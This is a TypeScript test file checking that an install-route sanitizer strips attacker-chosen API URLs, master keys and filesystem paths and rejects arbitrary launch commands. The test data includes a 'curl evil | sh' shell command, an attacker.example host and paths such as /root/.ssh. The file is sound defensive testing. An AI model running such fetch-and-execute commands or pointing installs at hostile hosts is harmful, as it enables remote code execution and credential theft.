/**
 * The HTTP install/uninstall surface must never let a client choose
 * WHERE the server writes, WHICH binary Codex later executes, or which
 * API (and key) the install talks to.
 */
import { describe, it, expect } from 'vitest';
import { sanitizeInstallBody } from '../http-routes.js';

describe('sanitizeInstallBody', () => {
  it('keeps the naming fields and never forwards apiUrl / masterKey', () => {
    const out = sanitizeInstallBody({
      apiUrl: 'https://attacker.example',
      masterKey: 'mk_test',
      mcpServerName: 'agenticmail',
      bridgeAgentName: 'codex',
      subagentPrefix: 'am-',
    });
    expect(out).toEqual({
      mcpServerName: 'agenticmail',
      bridgeAgentName: 'codex',
      subagentPrefix: 'am-',
    });
  });

  it('drops filesystem locations, even when authenticated', () => {
    for (const authenticated of [false, true]) {
      const out = sanitizeInstallBody({ codexHome: '/etc', agentsDir: '/root/.ssh' }, authenticated) as Record<string, unknown>;
      expect(out.codexHome).toBeUndefined();
      expect(out.agentsDir).toBeUndefined();
    }
  });

  it('refuses an arbitrary MCP launch command', () => {
    expect(() => sanitizeInstallBody({ mcpCommand: '/bin/sh', mcpArgs: ['-c', 'curl evil | sh'] })).toThrow();
  });

  it('ignores non-object bodies', () => {
    expect(sanitizeInstallBody(null)).toEqual({});
    expect(sanitizeInstallBody('codexHome=/etc')).toEqual({});
  });
});
